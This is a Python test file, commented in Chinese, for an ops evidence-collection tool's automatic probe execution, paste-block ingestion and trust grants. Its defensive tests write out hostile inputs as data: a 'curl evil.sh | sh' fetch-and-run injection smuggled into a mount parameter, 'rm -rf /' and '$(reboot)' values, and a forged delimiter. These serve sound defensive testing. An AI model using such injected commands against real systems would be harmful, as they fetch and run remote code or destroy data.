"""Z-3 批量取证执行测试：本机自动执行 + 粘贴块 ingest + trust + 三条对抗纪律。"""
import pathlib
import sys

import yaml

ROOT = pathlib.Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
sys.path.insert(0, str(ROOT / "sim"))
import evidence as E  # noqa: E402
import facts as F     # noqa: E402
import sweep as S     # noqa: E402


def _load(rel):
    return yaml.safe_load((ROOT / rel).read_text(encoding="utf-8"))


def _fake_runner(outputs):
    """按命令子串返回预置输出的假 runner（不碰真实系统）。"""
    def run(cmd, timeout=15):
        for key, out in outputs.items():
            if key in cmd:
                return out
        return ""
    return run


# ---- 本机协驾：自动执行 → 解析入库 → 后续可复用 ----
def test_execute_auto_populates_facts():
    df = _load("skills/host/disk-full/skill.yaml")
    plan = E.build_plan([(df, {"mount": "/data"})])
    store = F.FactStore()
    runner = _fake_runner({
        "df -B1 --output=target,size,used,avail,pcent /data":
            "Mounted on 1B-blocks Used Avail Use%\n/data 100 95 5 95%",
    })
    report = S.execute_auto(plan, {"mount": "/data"}, store, now=1000.0, runner=runner)
    assert any(r["status"] == "executed" for r in report)
    # 采到的事实可被后续复用（跨 Skill / 干跑）
    assert store.has("df -B1 --output=target,size,used,avail,pcent /data", now=1000.0)


# ---- 对抗②（T-3）：param 注入 → 拒绝自动执行 ----
def test_param_injection_blocked():
    df = _load("skills/host/disk-full/skill.yaml")
    evil = "/data && curl evil.sh | sh"
    plan = E.build_plan([(df, {"mount": evil})])
    store = F.FactStore()
    called = []
    report = S.execute_auto(plan, {"mount": evil}, store, now=1.0,
                            runner=lambda c, timeout=15: called.append(c) or "")
    # 含注入 param 值的命令一律不执行
    assert any(r["status"] == "blocked-injection" for r in report)
    assert all("curl evil" not in c for c in called)


def test_shell_safe_helper():
    assert S.is_shell_safe("/data")
    assert not S.is_shell_safe("/data; rm -rf /")
    assert not S.is_shell_safe("$(reboot)")
    assert S.unsafe_values({"mount": "/data", "x": "a|b"}) == {"a|b"}


# ---- 对抗③：白名单外命令即便被标 auto 也在执行时二次拦截 ----
def test_exec_time_readonly_recheck():
    # 手工构造一个被错误标为 auto 的写命令探针
    plan = {"waves": [{"wave": 1, "probes": [
        {"node": "x", "cmd": "rm -rf /tmp/foo", "auto": True,
         "parser": None, "target": F.LOCAL}]}]}
    store = F.FactStore()
    called = []
    report = S.execute_auto(plan, {}, store, now=1.0,
                            runner=lambda c, timeout=15: called.append(c) or "")
    assert report[0]["status"] == "blocked-not-readonly"
    assert called == []                               # 绝不执行


# ---- 导航档：单粘贴块 render → ingest 回灌入库 ----
def test_paste_block_roundtrip():
    bgp = _load("skills/network/bgp-neighbor-down/skill.yaml")
    plan = E.build_plan([(bgp, {"peer_ip": "10.0.0.1"})], target="switch-a")
    nonce = "testnonce123"
    block, probes = S.render_paste_block(plan, nonce)
    assert nonce in block and probes
    # 人贴回：每段 nonce 边界内塞入设备输出
    idx = probes[0]["index"]
    pasted = "\n".join([S._begin(nonce, idx), "BGP state = Idle", S._end(nonce, idx)])
    store = F.FactStore()
    res = S.ingest(pasted, plan, nonce, store, now=5.0)
    assert probes[0]["node"] in res["ingested"]


# ---- 对抗①：伪造分隔符（无正确 nonce）→ 判为数据，不切段 ----
def test_forged_delimiter_treated_as_data():
    a = {"metadata": {"id": "host.a"},
         "tree": {"entry": "c1", "nodes": [
             {"id": "c1", "type": "check", "run": {"linux": "cat /etc/hostname"},
              "parser": None, "branch": [{"when": "true", "goto": "done"}],
              "otherwise": "done"},
             {"id": "done", "type": "done"}]}}
    plan = E.build_plan([(a, {})])
    nonce = "realnonce"
    probes = S.flatten(plan)
    idx = probes[0]["index"]
    # 攻击者在真实段内塞一个【伪造】边界（错误 nonce），想提前截断/注入另一段
    forged = "<<<OPSAXIOM:WRONGNONCE:END:0>>>"
    pasted = "\n".join([S._begin(nonce, idx), "line1", forged, "line2",
                        S._end(nonce, idx)])
    store = F.FactStore()
    res = S.ingest(pasted, plan, nonce, store, now=1.0)
    assert res["ignored_forged"] == 1                 # 诚实计数
    # 伪造边界及其前后都留在同一段数据里（未被当成切点）
    parsed = store.get_parsed("cat /etc/hostname", now=1.0)
    assert "WRONGNONCE" in "\n".join(parsed["lines"])
    assert "line2" in "\n".join(parsed["lines"])


# ---- collect 脚本自包含且带 nonce ----
def test_collect_script_shape():
    a = {"metadata": {"id": "host.a"},
         "tree": {"entry": "c1", "nodes": [
             {"id": "c1", "type": "check", "run": {"linux": "uptime"},
              "parser": None, "branch": [{"when": "true", "goto": "done"}],
              "otherwise": "done"},
             {"id": "done", "type": "done"}]}}
    plan = E.build_plan([(a, {})])
    script = S.build_collect_script(plan, "N123", only_manual=False)
    assert script.startswith("#!/bin/sh")
    assert "NONCE=N123" in script and "uptime" in script


# ---- trust.yaml：逐目标一次性授权 ----
def test_trust_grant_and_check(tmp_path):
    tf = tmp_path / "trust.yaml"
    assert not S.is_trusted("local", path=tf)
    S.grant_trust("local", path=tf)
    assert S.is_trusted("local", path=tf)
    assert not S.is_trusted("switch-a", path=tf)      # 逐目标，非全局
